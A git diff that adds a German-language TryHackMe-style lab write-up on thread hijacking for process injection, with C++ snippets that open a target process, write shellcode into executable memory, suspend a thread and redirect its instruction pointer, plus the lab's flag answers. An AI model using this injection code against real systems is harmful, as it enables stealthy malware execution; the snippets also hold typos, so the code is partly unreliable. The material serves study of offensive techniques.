@@ -345,3 +345,122 @@ Welche Flagge wird nach dem Ausführen von Hollowing und dem Einspritzen des She
 ```
 THM{7h3r35_n07h1n6_h3r3}
 ```
+
+# Task 4 - Missbrauch von Prozesskomponenten
+Auf einer höheren Ebene kann Thread-Hijacking in elf Schritte unterteilt werden:
+
+1. Lokalisieren und öffnen Sie einen Zielprozess zur Steuerung.
+2. Allokieren Sie einen Speicherbereich für den bösartigen Code.
+3. Schreiben Sie den bösartigen Code in den allokierten Speicher.
+4. Identifizieren Sie die Thread-ID des Zielthreads, den Sie übernehmen möchten.
+5. Öffnen Sie den Zielthread.
+6. Halten Sie den Zielthread an.
+7. Erhalten Sie den Thread-Kontext.
+8. Aktualisieren Sie den Befehlszeiger (Instruction Pointer) auf den bösartigen Code.
+9. Aktualisieren Sie den Thread-Kontext des Zielthreads.
+10. Setzen Sie den übernommenen Thread fort.
+
+Wir werden ein einfaches Thread-Hijacking-Skript aufschlüsseln, um jeden der Schritte zu identifizieren und unten ausführlicher zu erklären.
+
+Die ersten drei Schritte in dieser Technik folgen denselben gängigen Schritten wie bei der normalen Prozesseinspritzung. Diese werden nicht erklärt, stattdessen finden Sie den dokumentierten Quellcode unten.
+```C++
+HANDLE hProcess = OpenProcess(
+	PROCESS_ALL_ACCESS, // Requests all possible access rights
+	FALSE, // Child processes do not inheret parent process handle
+	processId // Stored process ID
+);
+PVOIF remoteBuffer = VirtualAllocEx(
+	hProcess, // Opened target process
+	NULL, 
+	sizeof shellcode, // Region size of memory allocation
+	(MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
+	PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the commited pages
+);
+WriteProcessMemory(
+	processHandle, // Opened target process
+	remoteBuffer, // Allocated memory region
+	shellcode, // Data to write
+	sizeof shellcode, // byte size of data
+	NULL
+);
+```
+
+Nachdem die anfänglichen Schritte erledigt sind und unser Shellcode im Speicher geschrieben ist, können wir zum vierten Schritt übergehen. Im vierten Schritt müssen wir damit beginnen, den Thread des Prozesses zu hijacken, indem wir die Thread-ID identifizieren. Um die Thread-ID zu identifizieren, müssen wir eine Kombination von Windows-API-Aufrufen verwenden: `CreateToolhelp32Snapshot()`, `Thread32First()` und `Thread32Next()`. Diese API-Aufrufe durchlaufen gemeinsam eine Momentaufnahme eines Prozesses und ermöglichen es, Prozessinformationen aufzulisten.
+```C++
+THREADENTRY32 threadEntry;
+
+HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specificed process
+	TH32CS_SNAPTHREAD, // Include all processes residing on the system
+	0 // Indicates the current process
+);
+Thread32First( // Obtains the first thread in the snapshot
+	hSnapshot, // Handle of the snapshot
+	&threadEntry // Pointer to the THREADENTRY32 structure
+);
+
+while (Thread32Next( // Obtains the next thread in the snapshot
+	snapshot, // Handle of the snapshot
+	&threadEntry // Pointer to the THREADENTRY32 structure
+)) {
+```
+
+Im fünften Schritt haben wir alle erforderlichen Informationen im Strukturzeiger gesammelt und können den Zielthread öffnen. Um den Thread zu öffnen, verwenden wir `OpenThread` mit dem Strukturzeiger `THREADENTRY32`.
+```
+if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process ID's match
+		{
+			HANDLE hThread = OpenThread(
+				THREAD_ALL_ACCESS, // Requests all possible access rights
+				FALSE, // Child threads do not inheret parent thread handle
+				threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
+			);
+			break;
+		}
+
+```
+
+Im sechsten Schritt müssen wir den geöffneten Zielthread anhalten. Dazu können wir die Funktion `SuspendThread` verwenden.
+```
+SuspendThread(hThread);
+```
+
+Im siebten Schritt müssen wir den Thread-Kontext erhalten, um ihn in den kommenden API-Aufrufen zu verwenden. Dies kann mit der Funktion `GetThreadContext` durch Speichern eines Zeigers erreicht werden.
+```
+CONTEXT context;
+GetThreadContext(
+	hThread, // Handle for the thread 
+	&context // Pointer to store the context structure
+);
+```
+
+Im achten Schritt müssen wir den RIP (Instruction Pointer Register) überschreiben, um ihn auf unseren bösartigen Speicherbereich zu setzen. Falls Sie noch nicht mit CPU-Registern vertraut sind, ist RIP ein x64-Register, das die nächste Codeanweisung bestimmt und im Wesentlichen den Ablauf einer Anwendung im Speicher kontrolliert. Um das Register zu überschreiben, können wir den Thread-Kontext für RIP aktualisieren.
+```
+context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation
+```
+
+Im neunten Schritt wird der Kontext aktualisiert und muss auf den aktuellen Thread-Kontext gesetzt werden. Dies kann einfach mit `SetThreadContext` und dem Zeiger auf den Kontext durchgeführt werden.
+```
+SetThreadContext(
+	hThread, // Handle for the thread 
+	&context // Pointer to the context structure
+);
+```
+
+Im letzten Schritt können wir nun den Zielthread aus dem angehaltenen Zustand herausnehmen. Hierfür verwenden wir die Funktion `ResumeThread`.
+```
+ResumeThread(
+	hThread // Handle for the thread
+);
+```
+Wir können diese Schritte zusammenstellen, um einen Prozessinjektor mittels Thread-Hijacking zu erstellen. Verwenden Sie den bereitgestellten C++-Injector und experimentieren Sie mit Thread-Hijacking.
+
+## Fragen:
+
+Identifizieren Sie die PID eines Prozesses, der unter dem Namen THM-Attacker läuft und den Sie als Ziel verwenden möchten. Übergeben Sie diese PID als Argument, um thread-injector.exe auszuführen, das sich im Verzeichnis "Injectors" auf dem Desktop befindet.
+```
+Starte den Task Manager und gehe zu den Reiter Details und suche dort nach einem Prozess, als beispiel nutzte ich den Explorer.exe prozess. syntax thread-injector.exe <PID>
+```
+
+Welche Flagge wird nach dem Hijacking des Threads erhalten?
+```
+THM{w34p0n1z3d_53w1n6}
+```
